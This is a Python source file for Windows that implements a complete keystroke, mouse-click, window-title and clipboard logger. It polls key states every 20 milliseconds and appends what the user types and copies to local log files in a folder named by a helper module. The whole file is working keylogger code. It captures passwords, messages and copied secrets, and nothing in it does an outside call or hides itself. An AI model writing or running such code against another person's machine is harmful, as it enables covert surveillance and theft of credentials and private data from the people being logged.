import os
import time
import ctypes
import ctypes.wintypes as w
from datetime import datetime
import sys
import importlib.util

user32 = ctypes.WinDLL('user32', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

GetAsyncKeyState = user32.GetAsyncKeyState
GetAsyncKeyState.argtypes = [ctypes.c_int]
GetAsyncKeyState.restype = ctypes.c_short

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = [ctypes.c_int]
GetKeyState.restype = ctypes.c_short

GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_byte * 256)]
GetKeyboardState.restype = ctypes.c_bool

MapVirtualKey = user32.MapVirtualKeyW
MapVirtualKey.argtypes = [ctypes.c_uint, ctypes.c_uint]
MapVirtualKey.restype = ctypes.c_uint

ToAscii = user32.ToAscii
ToAscii.argtypes = [
    ctypes.c_uint, ctypes.c_uint,
    ctypes.POINTER(ctypes.c_byte * 256),
    ctypes.POINTER(ctypes.c_uint),
    ctypes.c_uint
]
ToAscii.restype = ctypes.c_int

GetForegroundWindow = user32.GetForegroundWindow
GetForegroundWindow.argtypes = []
GetForegroundWindow.restype = w.HWND

GetWindowTextLength = user32.GetWindowTextLengthW
GetWindowTextLength.argtypes = [w.HWND]
GetWindowTextLength.restype = ctypes.c_int

GetWindowText = user32.GetWindowTextW
GetWindowText.argtypes = [w.HWND, w.LPWSTR, ctypes.c_int]
GetWindowText.restype = ctypes.c_int

OpenClipboard = user32.OpenClipboard
OpenClipboard.argtypes = [w.HWND]
OpenClipboard.restype = ctypes.c_bool

EmptyClipboard = user32.EmptyClipboard
EmptyClipboard.argtypes = []
EmptyClipboard.restype = ctypes.c_bool

GetClipboardData = user32.GetClipboardData
GetClipboardData.argtypes = [ctypes.c_uint]
GetClipboardData.restype = w.HANDLE

CloseClipboard = user32.CloseClipboard
CloseClipboard.argtypes = []
CloseClipboard.restype = ctypes.c_bool

GlobalLock = kernel32.GlobalLock
GlobalLock.argtypes = [w.HANDLE]
GlobalLock.restype = ctypes.c_void_p

GlobalUnlock = kernel32.GlobalUnlock
GlobalUnlock.argtypes = [w.HANDLE]
GlobalUnlock.restype = ctypes.c_bool

CF_TEXT = 1
CF_UNICODETEXT = 13

VK_LBUTTON = 0x01
VK_RBUTTON = 0x02
VK_CANCEL = 0x03
VK_MBUTTON = 0x04
VK_XBUTTON1 = 0x05
VK_XBUTTON2 = 0x06
VK_BACK = 0x08
VK_TAB = 0x09
VK_CLEAR = 0x0C
VK_RETURN = 0x0D
VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12
VK_PAUSE = 0x13
VK_CAPITAL = 0x14
VK_ESCAPE = 0x1B
VK_SPACE = 0x20
VK_PRIOR = 0x21
VK_NEXT = 0x22
VK_END = 0x23
VK_HOME = 0x24
VK_LEFT = 0x25
VK_UP = 0x26
VK_RIGHT = 0x27
VK_DOWN = 0x28
VK_INSERT = 0x2D
VK_DELETE = 0x2E
VK_0 = 0x30
VK_9 = 0x39
VK_A = 0x41
VK_Z = 0x5A
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_APPS = 0x5D
VK_NUMPAD0 = 0x60
VK_NUMPAD9 = 0x69
VK_MULTIPLY = 0x6A
VK_ADD = 0x6B
VK_SUBTRACT = 0x6D
VK_DECIMAL = 0x6E
VK_DIVIDE = 0x6F
VK_F1 = 0x70
VK_F24 = 0x87
VK_NUMLOCK = 0x90
VK_SCROLL = 0x91
VK_LSHIFT = 0xA0
VK_RSHIFT = 0xA1
VK_LCONTROL = 0xA2
VK_RCONTROL = 0xA3
VK_LMENU = 0xA4
VK_RMENU = 0xA5

VK_TO_NAME = {
    VK_LBUTTON: "VK_LBUTTON", VK_RBUTTON: "VK_RBUTTON", VK_MBUTTON: "VK_MBUTTON",
    VK_XBUTTON1: "VK_XBUTTON1", VK_XBUTTON2: "VK_XBUTTON2",
    VK_BACK: "VK_BACK", VK_TAB: "VK_TAB",
    VK_RETURN: "VK_RETURN", VK_SHIFT: "VK_SHIFT", VK_CONTROL: "VK_CONTROL", VK_MENU: "VK_MENU",
    VK_ESCAPE: "VK_ESCAPE", VK_SPACE: "VK_SPACE", VK_PRIOR: "VK_PRIOR", VK_NEXT: "VK_NEXT",
    VK_END: "VK_END", VK_HOME: "VK_HOME", VK_LEFT: "VK_LEFT", VK_UP: "VK_UP",
    VK_RIGHT: "VK_RIGHT", VK_DOWN: "VK_DOWN", VK_INSERT: "VK_INSERT", VK_DELETE: "VK_DELETE",
    VK_CAPITAL: "VK_CAPITAL", VK_NUMLOCK: "VK_NUMLOCK", VK_SCROLL: "VK_SCROLL",
    VK_LSHIFT: "VK_LSHIFT", VK_RSHIFT: "VK_RSHIFT", VK_LCONTROL: "VK_LCONTROL",
    VK_RCONTROL: "VK_RCONTROL", VK_LMENU: "VK_LMENU", VK_RMENU: "VK_RMENU",
    VK_LWIN: "VK_LWIN", VK_RWIN: "VK_RWIN", VK_APPS: "VK_APPS"
}
for i in range(VK_F1, VK_F24 + 1):
    VK_TO_NAME[i] = f"VK_F{i - VK_F1 + 1}"
for i in range(VK_NUMPAD0, VK_NUMPAD9 + 1):
    VK_TO_NAME[i] = f"VK_NUMPAD{i - VK_NUMPAD0}"
   
INTERVAL_MS = 20

PC_LOGGER_PATH = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "modules", "pc_logger.py")
)


if not os.path.isfile(PC_LOGGER_PATH):
    print(f"[!] pc_logger.py not found at {PC_LOGGER_PATH}", file=sys.stderr)
    
    log_dir = os.path.join(os.path.dirname(__file__), "PCLogs")
    os.makedirs(log_dir, exist_ok=True)
    get_pc_log_folder = lambda create_if_missing=False: log_dir
else:
    spec = importlib.util.spec_from_file_location("pc_logger", PC_LOGGER_PATH)
    pc_logger = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(pc_logger)
    get_pc_log_folder = pc_logger.get_pc_log_folder   

log_dir = get_pc_log_folder(create_if_missing=True)   
os.makedirs(log_dir, exist_ok=True)                  
KEY_LOG_FILE = os.path.join(log_dir, "key_logs.log")
MOUSE_LOG_FILE = os.path.join(log_dir, "mouse_logs.log")
CLIPBOARD_LOG_FILE = os.path.join(log_dir, "clipboard.log")

last_key_state = bytearray(256)
last_active_window = ""
last_clipboard_check = 0
last_clipboard_content = ""

def get_clipboard_text():
    text = ""
    if OpenClipboard(None):
        hData = GetClipboardData(CF_UNICODETEXT)
        if hData:
            data = GlobalLock(hData)
            if data:
                text = ctypes.wstring_at(data)
                GlobalUnlock(hData)
        CloseClipboard()
    return text

def get_char_from_vk(vk, keyboard_state):
    scan_code = MapVirtualKey(vk, 0)
    char_buf = ctypes.c_uint(0)
    kb_state = (ctypes.c_byte * 256)(*keyboard_state)
    result = ToAscii(vk, scan_code, kb_state, ctypes.byref(char_buf), 0)
    if result > 0:
        return chr(char_buf.value & 0xFFFF)
    return None

def get_special_char(vk):
    specials = {
        VK_LBUTTON: "[LEFT CLICK]", VK_RBUTTON: "[RIGHT CLICK]", VK_MBUTTON: "[MIDDLE CLICK]",
        VK_XBUTTON1: "[X BUTTON 1]", VK_XBUTTON2: "[X BUTTON 2]",
        VK_RETURN: "[ENTER]", VK_BACK: "[BACKSPACE]", VK_SPACE: " ", VK_TAB: "[TAB]",
        VK_ESCAPE: "[ESC]", VK_INSERT: "[INSERT]", VK_DELETE: "[DELETE]",
        VK_HOME: "[HOME]", VK_END: "[END]", VK_PRIOR: "[PAGE UP]", VK_NEXT: "[PAGE DOWN]",
        VK_LEFT: "[LEFT ARROW]", VK_UP: "[UP ARROW]", VK_RIGHT: "[RIGHT ARROW]", VK_DOWN: "[DOWN ARROW]",
        VK_LSHIFT: "[SHIFT]", VK_RSHIFT: "[SHIFT]", VK_LCONTROL: "[CTRL]", VK_RCONTROL: "[CTRL]",
        VK_LMENU: "[ALT]", VK_RMENU: "[ALT]", VK_LWIN: "[WIN]", VK_RWIN: "[WIN]", VK_APPS: "[APPS]"
    }
    if VK_F1 <= vk <= VK_F24:
        return f"[F{vk - VK_F1 + 1}]"
    if VK_NUMPAD0 <= vk <= VK_NUMPAD9:
        return f"[NUM {vk - VK_NUMPAD0}]"
    if vk == VK_DECIMAL: return "[NUM .]"
    if vk == VK_MULTIPLY: return "[NUM *]"
    if vk == VK_ADD: return "[NUM +]"
    if vk == VK_SUBTRACT: return "[NUM -]"
    if vk == VK_DIVIDE: return "[NUM /]"
    if vk == VK_CAPITAL:
        return "[CAPS LOCK ON]" if (GetKeyState(VK_CAPITAL) & 1) else "[CAPS LOCK OFF]"
    if vk == VK_NUMLOCK:
        return "[NUM LOCK ON]" if (GetKeyState(VK_NUMLOCK) & 1) else "[NUM LOCK OFF]"
    if vk == VK_SCROLL:
        return "[SCROLL LOCK ON]" if (GetKeyState(VK_SCROLL) & 1) else "[SCROLL LOCK OFF]"
    return specials.get(vk)

def start_logger():
    global last_active_window, last_key_state, last_clipboard_check, last_clipboard_content
    print("Starting.. Press Ctrl+C to stop.")
    print(f"Key logs to: {KEY_LOG_FILE}")
    print(f"Mouse logs to: {MOUSE_LOG_FILE}")
    print(f"Clipboard logs to: {CLIPBOARD_LOG_FILE}")

    try:
        while True:
            time.sleep(INTERVAL_MS / 1000.0)

            current_time = time.time()
            if current_time - last_clipboard_check >= 60:  
                clipboard_content = get_clipboard_text()
                if clipboard_content != last_clipboard_content and clipboard_content:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open(CLIPBOARD_LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(f"[{timestamp}] Clipboard: {clipboard_content}\n")
                    last_clipboard_content = clipboard_content
                last_clipboard_check = current_time

            hwnd = GetForegroundWindow()
            if hwnd:
                length = GetWindowTextLength(hwnd)
                if length > 0:
                    buffer = ctypes.create_unicode_buffer(length + 1)
                    GetWindowText(hwnd, buffer, length + 1)
                    current_window = buffer.value
                    if current_window != last_active_window:
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
                            f.write(f"\n\n[{timestamp}] Active Window: {current_window}\n")
                        with open(MOUSE_LOG_FILE, "a", encoding="utf-8") as f:
                            f.write(f"\n\n[{timestamp}] Active Window: {current_window}\n")
                        last_active_window = current_window

            kb_state = (ctypes.c_byte * 256)()
            GetKeyboardState(kb_state)

            for vk in range(0x01, 0x100):
                is_pressed = (GetAsyncKeyState(vk) & 0x8000) != 0
                was_pressed = last_key_state[vk] != 0

                if is_pressed and not was_pressed:
                    char = get_special_char(vk)
                    if vk in {VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_XBUTTON1, VK_XBUTTON2}:
                        if char:
                            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            with open(MOUSE_LOG_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{timestamp}] {char}\n")
                    else:
                        if not char:
                            char = get_char_from_vk(vk, kb_state)
                        if char:
                            with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
                                f.write(char)

                last_key_state[vk] = 0x80 if is_pressed else 0

    except KeyboardInterrupt:
        print("Stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    start_logger()